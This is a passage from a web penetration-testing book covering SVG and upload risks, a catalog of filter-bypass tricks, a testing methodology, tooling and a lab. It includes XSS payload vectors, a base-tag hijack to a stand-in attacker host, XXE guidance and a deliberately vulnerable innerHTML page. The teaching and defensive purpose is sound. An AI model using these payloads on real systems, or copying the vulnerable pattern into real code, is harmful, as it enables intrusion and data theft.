`Content-Type`, send `nosniff`, force `Content-Disposition: attachment` for downloads, and serve
user files from a separate, non-app origin.

## 14.4 SVG: an XML island that scripts

SVG is the single most important "markup upload" format for a tester, because **SVG is XML that
can contain script and event handlers**, and it's frequently allowed where other HTML isn't
(avatars, logos, diagrams) and served inline.

A minimal scripting SVG (lab demonstration only, against authorized targets):

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>/* runs when the SVG is rendered as a document in the app's origin */</script>
</svg>
```

Event-handler variants that work even where `<script>` is stripped:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="/* code */"></svg>
<svg><a xlink:href="javascript:/* code */"><rect width="100" height="100"/></a></svg>
<svg><animate onbegin="/* code */" attributeName="x" dur="1s"/></svg>
```

Critical nuances:

- **Context of rendering matters.** An SVG loaded as an `<img src="x.svg">` does **not** run its
  script. But an SVG opened **as a top-level document** (navigating to `https://app.example/uploads/x.svg`)
  or embedded via `<object>`/`<iframe>`/inline `<svg>` in HTML **does** run script in that
  origin. So the question is always: *how does the app let users reach the SVG?*
- **`<use>` and external references** can pull in remote/embedded fragments.
- **Foreign-content parsing** (Chapter 3 §3.6) makes SVG a hotspot for **mutation XSS** and for
  bypassing HTML sanitizers that mishandle the HTML↔SVG boundary.

As a tester: if an app accepts SVG uploads (or SVG in rich text) and can serve/render it inline
or as a top-level document from its own origin, test for script execution. If it accepts SVG but
serves it only as `<img>` with `nosniff` and `Content-Disposition: attachment` from a separate
origin, the risk drops sharply.

## 14.5 XML-adjacent risks that ride on SVG/markup

Because SVG is XML, XML attack classes can appear:

- **XXE (XML External Entity).** If the server *parses* uploaded SVG/XML with a misconfigured
  parser, external-entity declarations can read local files or trigger SSRF. This is a
  server-side bug surfaced through a markup upload. Test SVG/XML inputs with entity declarations
  where parsing occurs.
- **Billion-laughs / entity-expansion DoS** on naive parsers.

These are out of the pure-HTML lane but commonly reached *through* an SVG upload field, so keep
them in mind when you see "upload an SVG/XML" features.

## 14.6 Filename and metadata injection

The file's **name** and **metadata** are attacker-controlled strings that often get rendered:

- A filename like `"><svg onload=...>.png` reflected unencoded into an upload listing or an
  admin file browser is stored XSS via filename. (Also test path traversal: `../../` in
  filenames.)
- **EXIF/metadata** fields (camera, comments, geotags) displayed in a gallery UI can carry
  payloads.
- **Content-Disposition filename** handling and download dialogs can be abused on some stacks.

Treat filenames and metadata as untrusted input subject to the same context/encoding analysis as
any other reflection (Part III).

## 14.7 Markup tricks that defeat naive filters (catalog)

A consolidated reference of parser-level tricks (mechanisms explained in Chapter 3). Use only
against authorized targets; these illustrate *why blocklist filtering fails*.

- **Case and whitespace:** `<ScRiPt>`, `<img/src=x/onerror=...>`, tabs/newlines/`/` as attribute
  separators.
- **Recursive strip:** `<scr<script>ipt>` against single-pass tag removers.
- **Attribute-context entity decoding:** `<a href="javascript&#58;...">`, `&#x6a;avascript:`.
- **Protocol obfuscation:** `java\tscript:`, `JaVaScRiPt:`, leading/trailing whitespace and
  control chars in URLs.
- **No-`<script>` vectors:** `<svg onload>`, `<img onerror>`, `<details ontoggle open>`,
  `<input autofocus onfocus>`, media `onerror`, CSS-animation `onanimationstart`.
- **Special elements / RCDATA breakouts:** `</textarea>`, `</title>`, `</style>`, `</script>`.
- **Foreign content / mXSS:** SVG/MathML structures and sanitizer round-trip mismatches.
- **Comment breakouts:** `--><svg onload=...>`.
- **`<base>` hijack:** inject `<base href="//attacker/">` to repoint relative URLs (Chapter 5).
- **`<noscript>`/`<template>` quirks:** parsing differs when script is disabled or content is
  inert-then-activated.
- **Charset/encoding:** UTF-7 and charset confusion on legacy stacks (Chapter 3 §3.9).
- **Dangling markup:** unterminated attribute to swallow page bytes (Chapter 7 §7.5), useful when
  script is blocked.

Each entry is a manifestation of the same root cause: a filter modeling HTML differently than the
browser parses it. A maintained allow-list sanitizer + CSP defeats the whole category far better
than chasing individual tricks.

## 14.8 Detecting these issues (procedure)

**Uploads:**
1. Find every upload feature; note allowed types and how files are *served back* (origin,
   `Content-Type`, `nosniff`, `Content-Disposition`).
2. Bypass `accept`/extension/MIME client checks via a proxy; submit a file the server shouldn't
   accept.
3. Try **HTML** and **SVG** uploads; if served inline from the app origin, test for script
   execution by navigating to the file or finding where it renders.
4. Try **polyglots** and content-type confusion; check whether sniffing turns "images" into HTML.
5. Inject payloads into **filenames** and **metadata**; check listings/admin views.
6. Where XML/SVG is parsed server-side, test for **XXE**.

**Markup tricks:** when you hit a filter (Part III), characterize it (Chapter 7 §7.7) and walk
the catalog above until you find an unhandled case — then report the *class* of weakness, not
just the one payload.

## 14.9 Fixing uploads and markup risks

**Uploads:**
- **Validate server-side by content**, not extension/`accept`/client MIME. Re-encode images
  through a trusted library to strip embedded payloads where feasible.
- **Set a correct, restrictive `Content-Type`** and **`X-Content-Type-Options: nosniff`** on all
  served files.
- **Serve user files from a separate origin** (a different domain, not just a path) so even if
  they're HTML/SVG they can't script the app origin; and/or force
  `Content-Disposition: attachment` for downloads.
- **Disallow inline rendering of SVG/HTML** unless absolutely required; if SVG must render
  inline, **sanitize it** with a vetted SVG-aware sanitizer and serve under a strong CSP.
- **Randomize stored filenames** and encode any displayed filename/metadata.
- **Harden XML parsers**: disable external entities and DTD processing to prevent XXE.

**Markup/sanitization:**
- Use a **vetted, maintained allow-list HTML sanitizer**; never hand-roll blocklists.
- Apply a strong **CSP** (Chapter 19) as defense in depth — it blunts most of the trick catalog.
- Encode output by **context** (Part III / Chapter 18).

## 14.10 Lab exercise

In your lab (Juice Shop and DVWA both have upload features; or build a small upload endpoint):

1. Upload an SVG containing a benign `onload` and try to reach it as a top-level document from
   the app origin. Note whether it executes. Then re-test when served from a separate origin /
   with `nosniff` + `attachment` and observe it neutralized.
2. Craft an `<svg onload>` payload to bypass a filter that strips `<script>`.
3. Upload a file with a payload in its **filename** and find where the listing reflects it.
4. If your lab has an XML/SVG parser, test a benign XXE entity that reads a harmless local file
   you placed for the test (lab only).
5. Take one filter from Part III and bypass it using three different entries from the §14.7
   catalog; note that each exploits a parser/filter mismatch.

---

## Key takeaways

- An upload is an XSS path whenever attacker bytes are later **interpreted as markup in the
  target origin** — driven by served `Content-Type`, **MIME sniffing**, inline SVG/HTML, or
  reflected filenames/metadata.
- `accept`/extension/client-MIME checks are **not controls**; validate by content, server-side.
- **SVG is XML that scripts**: it runs as a top-level document / inline embed (not as `<img>`),
  is a mutation-XSS hotspot, and can surface **XXE** when parsed server-side.
- The markup-trick catalog (case/whitespace, recursive strip, entity decoding, no-`<script>`
  vectors, RCDATA/comment breakouts, foreign content, `<base>` hijack, dangling markup) all
  stems from filter↔browser parsing mismatches.
- Fix with content-based validation, correct `Content-Type` + `nosniff` + `attachment`,
  **separate-origin serving**, vetted allow-list sanitizers, hardened XML parsers, and CSP.

---

<a id="15-methodology"></a>

# Chapter 15 — A Testing Methodology for HTML Vulnerabilities

> Knowing payloads isn't testing. Testing is a *repeatable process* that ensures you cover the
> surface, reason about each finding, and produce evidence others can act on. This chapter ties
> the previous parts into a methodology you can run on any engagement.

---

## 15.1 Where HTML testing fits in a broader assessment

A web penetration test usually follows recognizable phases (and aligns with frameworks like the
OWASP Web Security Testing Guide and the PTES):

1. **Pre-engagement** — scope, rules of engagement, authorization (Chapter 1).
2. **Reconnaissance & mapping** — enumerate the application (Chapter 6).
3. **Vulnerability discovery** — the core testing, including the HTML-centric work in this book.
4. **Exploitation & impact demonstration** — prove findings with benign PoCs.
5. **Post-exploitation / chaining** — combine findings (e.g., CSRF→XSS→account takeover).
6. **Reporting** — communicate risk and remediation.
7. **Retest** — verify fixes.

HTML vulnerabilities (injection, XSS, CSRF, clickjacking, upload/SVG) live mainly in phases 3–5,
but they depend completely on a thorough phase 2.

## 15.2 The HTML testing loop

For HTML-centric work, run this loop, which operationalizes the whole book:

```
        ┌─────────────────────────────────────────────────────┐
        │  1. MAP      find every input + every output (Ch.6)   │
        │  2. PROBE    canary string → learn encoding/filter    │
        │  3. CLASSIFY context + encoding + reach per reflection│
        │  4. CRAFT    context-appropriate payload (Ch.7–10)    │
        │  5. CONFIRM  benign PoC; verify in rendered DOM        │
        │  6. ASSESS   impact, reach, chainability               │
        │  7. RECORD   request/response/screenshot + cleanup     │
        └─────────────────────────────────────────────────────┘
```

The discipline is doing steps 2–3 *before* step 4. Most wasted time in XSS testing comes from
firing payloads before understanding context.

## 15.3 Step 1 — Map (recap of Chapter 6)

Build the master inventory: endpoints (incl. hidden params and APIs), reflections (input →
output → context → encoding → reach), state-changing actions, framing posture, and security
headers. Use a proxy to record everything you touch. Don't skip authenticated and role-gated
areas — they often hold the high-impact bugs.

## 15.4 Step 2 — Probe with a canary

Submit the canary into each input and observe what survives:

```
zqxj'"<>`/\(){}[];:=&#
```

Record per reflection:
- Which of `< > " ' &` survived literally vs were entity-encoded vs stripped.
- Whether anything was double-encoded or URL-encoded.
- Whether the reflection is in a special parsing context (`<script>`, `<textarea>`, `<svg>`...).

This single step tells you, for each location, whether a vulnerability is even plausible and
what your break-out character must be.

## 15.5 Step 3 — Classify context and reach

For each surviving reflection, write down:
- **Context:** element content / quoted attr / unquoted attr / single-quoted attr / event
  handler / `<script>` / URL / CSS / comment / RCDATA / foreign content.
- **Encoding applied:** none / HTML-entity / JS-string / URL / double.
- **Reach:** self-only / other users / admins / internal tools (blind).

Prioritize by **reach × impact**: an unencoded reflection that reaches admins outranks a
reflected self-only one.

## 15.6 Step 4 — Craft the payload

Choose the payload from the **context**, using Parts III–IV:
- Element content → `<svg onload=...>` / `<img src=x onerror=...>`.
- Quoted attribute → `"`-breakout or new `autofocus onfocus=...` attribute.
- `<script>` → JS-string breakout or `</script>` escape.
- URL → `javascript:` (with entity/encoding bypasses if filtered).
- Special elements → close them first (`</textarea>`, etc.).
- If filtered, characterize the filter and walk the bypass catalog (Chapter 14 §14.7).

Keep payloads **benign and tagged**.

## 15.7 Step 5 — Confirm in the rendered DOM

Always verify in DevTools → Elements (the live DOM), not just View Source, because client-side
code may transform output (Chapter 3/4). Use `alert(document.domain)` or a quiet `console.log`
token. For blind/stored cases, confirm via an out-of-band callback or a privileged view you're
authorized to access.

## 15.8 Step 6 — Assess impact and chaining

Ask what the finding *enables*:
- Does XSS run in an admin's session? → privilege escalation / account takeover.
- Can CSRF place a payload into a victim (CSRF→stored XSS)? Can it change email (→ takeover)?
- Does open redirect feed an OAuth flow?
- Does clickjacking bypass a CSRF token by using the real UI?
- Does an upload become same-origin HTML?

Chains are where severity multiplies; document the realistic worst case (without actually
harming real users).

## 15.9 Step 7 — Record and clean up

For each finding capture:
- The exact **request** (method, URL, headers, body) and **response** (or DOM screenshot).
- The **payload** and the **context/encoding** that made it work.
- **Reproduction steps** a developer can follow.
- **Impact** and **remediation** (Part VI).
- **Cleanup**: remove stored probes; list anything left behind so the client can purge it.

## 15.10 Manual vs automated testing

Both matter; neither suffices alone.

- **Scanners** (Chapter 16) are great at breadth: crawling, finding obvious reflected XSS, missing
  headers, and known patterns. Use them to cover ground and to avoid missing the easy stuff.
- **Manual testing** finds what scanners miss: context-specific break-outs, filter bypasses,
  DOM-XSS via reading bundles, second-order/blind stored XSS, business-logic-dependent CSRF, and
  clickjacking on the *right* pages.

A good rhythm: scan for breadth, then manually investigate every reflection, every
state-changing action, and every client-side source→sink flow the scanner can't reason about.

## 15.11 False positives and proof

Be rigorous about confirming:
- A reflected payload that appears in the response but is HTML-encoded is **not** XSS — verify
  interpretation in the DOM.
- A "missing" CSRF token might be validated elsewhere — actually replay without it.
- A scanner's "DOM XSS" hit may be a non-exploitable sink — trace the flow.

Reporting a false positive costs your credibility and the client's time. Prove every finding.

## 15.12 Coverage checklists

Keep these handy to ensure you didn't miss a class.

**Per reflection (XSS/injection):**
- [ ] Context identified; encoding probed with canary.
- [ ] Tried context-appropriate break-out.
- [ ] If filtered, characterized filter + tried bypass catalog.
- [ ] Checked rendered DOM, not just source.
- [ ] Checked all render locations (stored/second-order/blind).
- [ ] Noted CSP/Trusted Types posture.

**Per state-changing action (CSRF):**
- [ ] Auth mechanism + cookie `SameSite` recorded.
- [ ] Token present? Validated? Rejected when missing?
- [ ] Method/content-type downgrade tried.
- [ ] PoC built and verified as a controlled victim.

**Per sensitive page (clickjacking):**
- [ ] `X-Frame-Options` / `frame-ancestors` present?
- [ ] Frameable in a lab test?
- [ ] Sensitive single-click action identified.

**Per upload:**
- [ ] Server-side content validation? `nosniff`? `Content-Disposition`? Serving origin?
- [ ] HTML/SVG/polyglot accepted and rendered inline same-origin?
- [ ] Filename/metadata reflected?

**Headers/config:**
- [ ] CSP present and meaningful?
- [ ] Cookie flags (`HttpOnly`/`Secure`/`SameSite`)?
- [ ] `nosniff`, framing headers, correct content types?

## 15.13 Severity and prioritization

When ranking, weigh:
- **Reach:** how many users, and how privileged (admin XSS ≫ self XSS).
- **Authentication required:** unauth-exploitable is worse.
- **Persistence:** stored ≫ reflected ≫ self.
- **Ease of delivery:** GET-link reflected XSS is easier to weaponize than POST-only.
- **Chainability:** does it unlock account takeover or data theft?

Map these to your client's chosen rating system (e.g., CVSS) consistently, and explain the
reasoning, not just the score.

## 15.14 Reporting HTML findings well

A strong finding write-up includes:
1. **Title & severity** (e.g., "Stored XSS in profile bio rendered in admin console — High").
2. **Summary** in business terms (what an attacker could do).
3. **Affected component** (endpoint, parameter, render location).
4. **Reproduction steps** with the exact benign payload and where it executes.
5. **Evidence** (request/response, DOM screenshot).
6. **Impact** and realistic chains.
7. **Remediation** (context-appropriate encoding, sanitizer, CSP, headers — Part VI), specific
   to their stack.
8. **References** (OWASP, CWE IDs, vendor docs).

Write remediation a developer can act on this sprint, not a generic "sanitize input."

---

## Key takeaways

- Run a repeatable loop: **Map → Probe → Classify → Craft → Confirm → Assess → Record.** Do the
  classification *before* crafting payloads.
- Use a **canary** to learn encoding/filters; classify every reflection by **context + encoding +
  reach** and prioritize by reach × impact.
- Confirm in the **rendered DOM**, prove every finding, and avoid false positives.
- Combine scanners (breadth) with manual testing (context, bypasses, DOM/stored/blind, logic).
- Report with reproduction, evidence, realistic impact/chains, and **stack-specific remediation**;
  clean up stored artifacts.

---

<a id="16-tooling"></a>

# Chapter 16 — Tooling: Browser DevTools, Proxies, and Scanners

> Tools don't find bugs — testers do — but the right tools turn a slow manual grind into fast,
> repeatable analysis. This chapter covers the toolkit for HTML-centric testing: the browser's
> own DevTools, an intercepting proxy, automated scanners, and specialized helpers, with an
> emphasis on *what each is good for* rather than click-by-click instructions.

---

## 16.1 The browser is your primary instrument

Before any third-party tool, master the browser's built-in **DevTools** (F12 in Chromium/Firefox).
The panels you'll use constantly:

- **Elements / Inspector** — the **live DOM**. This is where you confirm whether your payload is
  interpreted as markup or shown as text (the difference between "vulnerable" and "not"). Use it
  to compare against View Source. You can edit attributes/nodes live to test client-side
  validation removal (Chapter 5).
- **Console** — run JS to inspect sources (`location.hash`, `document.referrer`, `window.name`),
  test sink behavior in your lab, and read errors. Great for safely demonstrating
  `innerHTML` vs `textContent` (Chapter 4).
- **Sources / Debugger** — read and **pretty-print** minified JS bundles, set breakpoints, and
  use **DOM breakpoints** ("break on subtree modification") to catch the exact line where a sink
  mutates the DOM — invaluable for DOM XSS (Chapter 10).
- **Network** — see real requests/responses, **headers** (CSP, `X-Frame-Options`, cookie flags,
  content types), redirects, and what actually came over the wire vs what JS rendered.
- **Application/Storage** — inspect cookies (and their `HttpOnly`/`Secure`/`SameSite` flags),
  `localStorage`/`sessionStorage` (token/PII exposure — Chapter 13), and **service worker**
  registrations.

Two browsers are worth keeping: a Chromium-based one and Firefox, because parser/feature quirks
occasionally differ and some payloads behave differently across engines.

> **View Source vs Elements:** View Source shows the bytes the server sent (pre-JS). Elements
> shows the current DOM (post-JS). For DOM XSS and any client-rendered content, only Elements
> tells the truth. Always confirm there.

## 16.2 The intercepting proxy: the heart of web testing

An intercepting proxy sits between your browser and the target, letting you view, modify, and
replay every request. This is the single most important external tool for web testing. The two
dominant choices:

- **Burp Suite** (PortSwigger) — Community edition (free, manual tools) and Professional (adds an
  active scanner and more automation). The de facto industry standard.
- **OWASP ZAP** — free and open source, with a capable scanner and automation; a strong
  alternative, especially where budget or open-source requirements matter.

Core proxy capabilities you'll use for HTML testing:

- **Intercept & modify** requests/responses on the fly — bypass client-side validation, tamper
  hidden fields, change content types.
- **HTTP history / sitemap** — your mapping record (Chapter 6).
- **Repeater (Burp) / Manual Request (ZAP)** — resend a single request with tweaks; the workhorse
  for crafting and iterating payloads, testing CSRF without tokens, content-type downgrades, etc.
- **Intruder (Burp) / Fuzzer (ZAP)** — automate sending many payloads/parameter values; useful
  for filter characterization and parameter discovery (use responsibly; respect rate limits in
  the RoE).
- **Decoder/Encoder** — quickly URL/HTML/Base64 encode/decode payloads to match contexts.
- **Comparer** — diff responses to spot subtle reflection/encoding differences.
- **Proxy CA certificate** — install it so you can intercept HTTPS in your test browser.

### Proxy features especially useful for this book's topics

- **CSRF PoC generator (Burp)** — turn a captured request into an auto-submitting HTML form PoC
  (Chapter 11). Always verify it matches the real request.
- **Clickjacking helper (Burp)** — frame a captured page to confirm frameability and build a PoC
  (Chapter 12).
- **Out-of-band interaction client (Burp Collaborator / ZAP OAST)** — a server you control that
  records DNS/HTTP callbacks, essential for **blind/stored XSS** detection and for confirming
  SSRF/XXE (Chapters 9, 14). Conceptually, your payload beacons to a unique subdomain and the
  client shows you the hit with context.
- **DOM Invader (Burp's browser)** — instruments the page to trace DOM-XSS **sources→sinks**
  automatically, surfacing flows you'd otherwise hunt by hand (Chapter 10).

## 16.3 Automated scanners: breadth, not depth

Scanners crawl an app and test for known vulnerability patterns. Used well, they ensure you don't
miss the obvious; used naively, they produce noise and false positives.

- **Burp Scanner / ZAP Active Scan** — integrated with the proxy; good at reflected XSS, missing
  headers, some stored/DOM patterns. Configure scope tightly and watch for destructive actions.
- **Dedicated/CI scanners** (e.g., Nuclei templates, commercial DAST) — fit pipelines and
  large-surface sweeps.

Limits to keep in mind:
- Scanners struggle with **context-specific** XSS, **filter bypasses**, **second-order/blind**
  stored XSS, **business-logic** CSRF, and **clickjacking on the right page**. These are where
  manual testing earns its keep (Chapter 15).
- Active scanning can be **noisy and state-changing** — it may submit forms, create/delete data,
  or trigger emails. Confirm it's permitted by the RoE and point it only at in-scope, ideally
  non-production targets.

## 16.4 Specialized and helper tools

- **Content-discovery / brute-forcing** (e.g., `ffuf`, `dirsearch`, gobuster, Burp's
  content-discovery) — find unlinked endpoints and files (Chapter 6).
- **Parameter discovery** (e.g., Arjun, Param Miner) — uncover hidden/undocumented parameters
  that reflect or change behavior.
- **JS analysis** (LinkFinder-style extractors, source-map parsers, `js-beautify`) — pull
  endpoints, parameter names, and **sinks** from bundles for DOM-XSS hunting.
- **Crawlers** (e.g., katana, hakrawler) — enumerate links/forms quickly to seed the proxy.
- **HTTP clients** (`curl`, `httpie`) — reproduce requests outside the browser to prove
  server-side behavior (e.g., that client-side validation isn't enforced).
- **Blind-XSS collectors** (XSS-Hunter-style self-hosted, or your proxy's OAST) — capture
  callbacks from internal tools.
- **Header/CSP analyzers** — evaluate CSP strength and missing security headers (also useful for
  Part VI verification).

Pick a small set you know deeply rather than collecting many you use shallowly.

## 16.5 A practical, repeatable setup

A reliable workspace for HTML testing:

1. A **dedicated browser profile** for testing, with the proxy CA installed and noisy extensions
   disabled.
2. The **proxy** (Burp/ZAP) configured with the target **in scope** so you don't accidentally
   capture or attack out-of-scope hosts.
3. **DevTools** open on the target tab for live DOM/Network/Storage inspection.
4. An **OAST/collaborator** endpoint ready for blind cases.
5. A **notes/inventory** doc (the Chapter 6 master inventory) and a place to store evidence
   (encrypted if it contains sensitive data — Chapter 1).
6. For DOM work, the proxy's instrumented browser (DOM Invader) or your own console/debugger
   workflow.

Scope configuration deserves emphasis: setting the proxy's target scope and enabling "intercept
only in-scope" protects you from the ethical/legal pitfalls in Chapter 1 — it's a guardrail, not
just convenience.

## 16.6 Using tools responsibly

- **Respect the RoE:** rate limits, time windows, no destructive scans, no out-of-scope hosts.
  Configure the tools to enforce these where possible (scope, throttling).
- **Beware active scanners on production** — they can create/delete data or send emails to real
  people. Prefer staging, or scan with great care and client coordination.
- **Keep collaborator/OAST payloads benign** and remove stored probes (Chapters 1, 9).
- **Secure your evidence** — proxy logs and screenshots often contain credentials, tokens, and
  PII.

## 16.7 Lab exercise

1. Install Burp **or** ZAP, configure the browser proxy, and install the CA. Confirm you can see
   HTTPS traffic to your local lab.
2. Set the lab app **in scope**; browse it and watch the sitemap/HTTP history populate (this is
   your map).
3. Send a reflecting request to **Repeater**; iterate a canary, then a context-appropriate
   payload, observing responses.
4. In **DevTools**, confirm a payload's interpretation in the **Elements** panel and inspect
   cookies/storage/headers in **Network** and **Application**.
5. Use the **debugger** to set a DOM breakpoint and catch a sink firing in a DOM-XSS lab.
6. Generate a **CSRF PoC** from a captured request and test it against a controlled session.
7. (If available) point the **OAST/collaborator** at a blind-XSS lab field and capture the
   callback.

Doing this end-to-end on a legal lab builds the muscle memory you'll use on real engagements.

---

## Key takeaways

- **DevTools** is your primary instrument: the **Elements** panel (live DOM) is where you confirm
  XSS; the **debugger** (DOM breakpoints) finds DOM-XSS sinks; **Network/Application** reveal
  headers, cookie flags, storage, and service workers.
- An **intercepting proxy** (Burp or ZAP) is essential — intercept/modify, Repeater, Intruder,
  Decoder, and helpers like the **CSRF PoC generator**, **clickjacking helper**, **OAST/
  collaborator** (blind XSS), and **DOM Invader** map directly onto this book's topics.
- **Scanners** give breadth but miss context-specific XSS, bypasses, second-order/blind stored
  XSS, logic-based CSRF, and targeted clickjacking — confirm and extend manually.
- Configure **scope** and **rate limits** in your tools as ethical/legal guardrails; keep probes
  benign and secure your evidence.

---

<a id="17-labs"></a>

# Chapter 17 — Hands-On Labs and Exercises

> Reading about XSS teaches you the words; breaking a lab teaches you the language. This chapter
> shows how to stand up safe, **legal** practice environments and gives a structured set of
> exercises mapped to every chapter — plus a tiny self-contained vulnerable page you can run
> locally to see the concepts with your own eyes.

---

## 17.1 The golden rule of practice

**Practice only on systems you own or are explicitly authorized to use.** Everything below is
either software you run on your own machine or a managed range that *grants* you permission. Do
not point these techniques at any other site. (See [Chapter 1](#01-legal-and-ethics).)

## 17.2 Legal practice targets

**Self-hosted intentionally vulnerable apps** (run locally, isolated):

- **OWASP Juice Shop** — a modern JavaScript app with a wide range of challenges, including many
  XSS variants. Great for realistic, SPA-style testing.
- **DVWA (Damn Vulnerable Web Application)** — classic PHP app with adjustable security levels
  (low/medium/high/impossible). Ideal for *comparing* a vulnerable vs fixed implementation of the
  same feature — perfect for this book's "how to fix" sections.
- **OWASP WebGoat** — lesson-based, guided exercises.
- **bWAPP / Mutillidae II** — large catalogs of vulnerabilities including HTML injection, all XSS
  types, CSRF, and clickjacking.

**Browser-based, hosted sandboxes (permission granted by the provider):**

- **PortSwigger Web Security Academy** — free, high-quality labs with dedicated sections for
  reflected, stored, and DOM XSS, CSRF, clickjacking, CORS, and more. The single best resource
  for the topics in this book, with guided solutions.

**Managed ranges:**

- **TryHackMe** and **Hack The Box** — legal environments with web-focused rooms/machines.

## 17.3 Isolating your lab

Keep vulnerable apps off the open internet and away from your real data:

- Run them on **localhost** or an isolated VM/container network.
- Don't expose ports publicly; if you must, restrict by firewall/VPN.
- Use a **dedicated browser profile** (Chapter 16) so test cookies/extensions don't mingle with
  your real sessions.
- Treat intentionally vulnerable apps as hostile — never put real credentials or data in them.

## 17.4 Quick start with containers

If you have Docker available, the common vulnerable apps run in one command each. (Use a throwaway
environment; these are deliberately insecure.)

```bash
# OWASP Juice Shop on http://localhost:3000
docker run --rm -p 3000:3000 bkimminich/juice-shop

# DVWA on http://localhost:8080 (then complete the DB setup in the UI)
docker run --rm -p 8080:80 vulnerables/web-dvwa
```

Then point your intercepting proxy (Chapter 16) at the app, add it to scope, and start the
Chapter 15 loop.

## 17.5 A tiny self-contained lab page

Sometimes you want to see a single concept in isolation without a whole app. Save the file below
as `lab.html` **on your own machine** and open it locally. It is intentionally vulnerable and is
for your private study only — never deploy it anywhere reachable by others.

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Local HTML Security Lab (private use only)</title>
</head>
<body>
  <h1>Local HTML Security Lab</h1>

  <!-- 1) Reflected sink: name from the query string written via innerHTML (vulnerable) -->
  <section>
    <h2>1. Reflected (innerHTML)</h2>
    <div id="reflected"></div>
    <p>Try: <code>?name=&lt;svg onload=alert(document.domain)&gt;</code></p>
  </section>

  <!-- 2) Safe comparison: same value via textContent (not vulnerable) -->
  <section>
    <h2>2. Safe (textContent)</h2>
    <div id="safe"></div>
  </section>

  <!-- 3) DOM hash sink (server never sees the payload) -->
  <section>
    <h2>3. DOM hash sink</h2>
    <div id="fromhash"></div>
    <p>Try: <code>#&lt;img src=x onerror=alert(document.domain)&gt;</code></p>
  </section>

  <script>
    const params = new URLSearchParams(location.search);
    const name = params.get('name') || '';

    // (1) VULNERABLE on purpose: untrusted data into innerHTML
    document.getElementById('reflected').innerHTML = 'Hello ' + name;

    // (2) SAFE: textContent treats data as text
    document.getElementById('safe').textContent = 'Hello ' + name;

    // (3) VULNERABLE on purpose: fragment -> document.write-like sink
    const frag = decodeURIComponent(location.hash.slice(1));
    document.getElementById('fromhash').innerHTML = frag;
  </script>
</body>
</html>
```

Open it as `file:///.../lab.html?name=...#...` and observe:

- Section 1 executes a benign `alert(document.domain)` while **Section 2, with the identical
  input, renders it as inert text** — the clearest possible demonstration that the *sink*, not
  the data, is the problem.
- Section 3 fires from the `#fragment`, which a server would never receive — the essence of DOM
  XSS (Chapter 10).

To experience the **fix**, change Section 1 and 3 to use `textContent` (or a sanitizer) and watch
the payloads neutralize. This before/after is the heart of Part VI.

## 17.6 Structured exercises mapped to the book

Work these against the legal targets above. Each maps to chapters so you can review the theory.

**Foundations (Part I)**
1. In DevTools console, run the markup-repair and fragment-parsing snippets from
   [Chapter 3 §3.12](#03-browser-parsing) and the source/sink drill from
   [Chapter 4 §4.11](#04-the-dom). Explain, in your own words, why the DOM differs
   from the source.

**Forms & surface (Part II)**
2. Pick a form in your lab app. Strip its client-side validation (`required`, `pattern`,
   `maxlength`) and submit invalid data directly via Repeater. Confirm whether the server
   enforces the rules (Chapter 5).
3. Build a **master inventory** (Chapter 6) for the whole lab app: endpoints, reflections
   (context/encoding/reach), state-changing actions, framing posture, security headers.

**HTML injection & XSS (Part III)**
4. Prove HTML injection with `<b>zqxj</b>`, then build a **content-spoofing** banner without
   script (Chapter 7).
5. Solve reflected XSS in **four contexts**: element content, quoted attribute, `<script>`, and
   URL (Chapter 8). For each, note which character the encoding should have neutralized.
6. Solve a **filtered** reflected-XSS case using a case/whitespace/entity bypass (Chapter 8/14).
7. Store an XSS payload and enumerate **every** place it renders, including any admin/staff view
   in the lab (Chapter 9). If the lab supports it, capture a **blind** callback.
8. Exploit a `location.search`→`innerHTML` and a `location.hash`→sink **DOM XSS**, confirming the
   server logs are silent for the hash case (Chapter 10).

**HTML-enabled attacks (Part IV)**
9. Find a state-changing action with weak CSRF protection; build an auto-submitting **form PoC**
   and verify as a controlled victim (Chapter 11). Then test a **content-type/method downgrade**.
10. Identify a page lacking framing protection and build a **clickjacking** alignment PoC at
    partial opacity (Chapter 12). Add `frame-ancestors 'none'` (if you control the response) and
    confirm the fix.
11. Upload an **SVG** with a benign `onload`; determine whether it executes when reached as a
    top-level document vs as `<img>` (Chapter 14). Test a **filename** injection.

**Methodology & tooling (Part V)**
12. Run the full **Chapter 15 loop** on one feature end-to-end and write a mini finding report
    (title, severity, repro, evidence, impact, remediation).
13. Configure **Burp or ZAP** scope and reproduce a finding in **Repeater**; generate a **CSRF
    PoC**; set a **DOM breakpoint** to catch a sink (Chapter 16).

**Defense (Part VI — after reading it)**
14. In DVWA, switch a vulnerable module from *low* to *high/impossible* and study the source diff:
    identify the **context-appropriate encoding** / token / header that fixed it (Chapters 18–19).
15. Add a **Content-Security-Policy** to your `lab.html` (e.g., a nonce-based `script-src` with no
    `'unsafe-inline'`) and confirm which payloads it blocks. Then add
    `require-trusted-types-for 'script'` and watch the `innerHTML` sinks start throwing.

## 17.7 Building good practice habits

- **Always confirm in the rendered DOM**, not just the response (Chapter 15).
- **Keep a payload journal**: which payload, which context, why it worked or didn't. Patterns
  emerge fast.
- **Re-implement the fix** for each bug you find; understanding the remediation makes you a far
  better tester and a credible reporter.
- **Vary browsers** occasionally to observe engine differences.
- **Reset your lab** between exercises so stored payloads don't confuse later tests.

## 17.8 From lab to engagement

The lab is where you make mistakes safely. On a real engagement, the same loop applies, but the
stakes change: real users, real data, real scope limits. Carry these habits over: stay in scope,
keep PoCs benign, clean up stored artifacts, and document everything. The technical skill you
build in the lab is necessary — the discipline from [Chapter 1](#01-legal-and-ethics) is
what makes it professional.

---

## Key takeaways

- Practice only on **owned or authorized** targets: self-hosted (Juice Shop, DVWA, WebGoat,
  bWAPP/Mutillidae) or permission-granting ranges (PortSwigger Academy, TryHackMe, HTB).
- **Isolate** vulnerable apps (localhost/VM, dedicated browser profile, no real data).
- A tiny local `lab.html` shows the core lesson directly: identical input is **inert via
  `textContent` but executes via `innerHTML`**, and `#fragment` sinks bypass the server entirely.
- Work the **chapter-mapped exercises**, then study the **fixes** (DVWA difficulty diffs, adding
  CSP/Trusted Types) to cement both attack and defense.

---

<a id="18-defense-remediation"></a>

# Chapter 18 — Secure Output Handling and Sanitization

> Every offensive chapter ended with "how to fix it." This chapter assembles those fixes into a
> coherent defensive doctrine. The single most important idea — repeated throughout the book — is
> finally stated in full: **treat data as data at the moment it becomes part of a page, in
> whatever context that is.**

---

## 18.1 The hierarchy of defenses

No single control stops everything. Defense is layered, in roughly this order of primacy:

